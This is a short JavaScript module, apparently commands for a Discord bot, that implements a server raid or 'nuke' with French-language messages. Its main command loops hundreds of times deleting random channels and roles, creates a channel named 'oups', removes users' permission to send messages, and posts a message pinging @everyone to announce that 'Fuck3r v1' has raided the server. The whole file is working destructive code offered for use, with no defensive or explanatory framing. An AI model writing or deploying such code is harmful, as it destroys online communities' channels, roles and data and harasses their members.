module.exports = [{
  name: "fuck",
  code: `$loop[1;fuck-msg]
$loop[1;fuck-ch]
  $loop[500;fuck-role]
  $loop[500;fuck]

  $title[Fuck4ge de serveur en cours]
  $description[Sors le popcorn et profite du spéctacle :)]
  $addTimestamp`
}, {
  type: 'awaitedCommand',
  name: "fuck",
  code: `$deleteChannels[$randomChannelID]`
}, {
  type: 'awaitedCommand',
  name: "fuck-role",
  code: `$deleteRoles[$randomRoleID]`
}, {
  type: 'awaitedCommand',
  name: "fuck-ch",
  code: `$createChannel[oups;text]`
}, {
  type: 'awaitedCommand',
  name: "fuck-msg",
  code: `$modifyChannelPerms[$randomChannelID;-sendmessages;+readmessages;$guildID]

$channelSendMessage[$randomChannelID;**Oups...**
Ce serveur viens de ce faire raid par Fuck3r v1.
Desole du derangement @everyone]`
}]